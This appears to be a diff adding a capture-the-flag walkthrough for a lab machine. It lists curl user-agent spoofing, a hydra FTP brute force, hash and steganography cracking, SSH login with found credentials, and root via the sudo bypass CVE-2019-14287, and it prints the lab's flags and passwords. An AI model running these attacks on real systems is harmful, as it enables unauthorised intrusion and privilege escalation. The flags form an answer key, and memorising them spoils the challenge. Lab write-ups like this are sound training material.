@@ -1,0 +1,50 @@
+#Open the IP as web page on browser
+->Found: Use your own codename as user-agent to access the site.
+->Download User-Agent switcher plugin
+->alternatively, use curl to spoof `curl -A "<codename>" -L <IP>` where in codename "C" was found
+->access /agent_C_attention.php
+->Found user: chris
+
+#Bruteforce FTP password
+->use hydra with rockyou.txt wordlist
+->Found: chris:crystal
+
+#Login to FTP using chris
+->Download the files using get <file>
+
+#Exploring the FTP files
+->Run binwalk on cutie.jpg
+--Found: zip archive
+--extract uisng binwalk -e
+--run zip2john on 8702.zip
+--use john on the generated hash
+--Found password: alien
+--trouble using unzip command, use 7z instead `7z e 8702.zip`
+--extracted To_agent$.txt
+--decode QXJlYTUx
+--decoded(base64): Area51
+->Extract data from cute-alien.jpg using steghide
+--use command `steghide extract -sf cute-alien.jpg`
+--use decoded password from steg (Area51)
+--Found: message.txt
+--cat message.txt
+--Found: james:hackerrules!
+
+#SSH using james:hackerrules!
+->Found: user_flag.txt
+--flag: b03d975e8c92a7c04146cfa7a5a313c7
+->Found: Alien_autopsy.jpg
+--get file using scp on local machine using command `scp james@<remote_ip>:Alien_autospy.jpg <directory_on_local_machine>`
+--Image reverse search the image using google
+--Found: Roswell alien autopsy
+
+#Privilege Escalation
+->running `sudo -l` reveals no command can be run as root
+--find exploit for (ALL, !root) /bin/bash
+--Found: CVE-2019-14287
+---run command `sudo -u#-1 /bin/bash` to be root
+->Found: root.txt
+--flag: b53a02f55b57d4439e3341834d70c062
+--Bonus: Agent R = DesKel
+
+
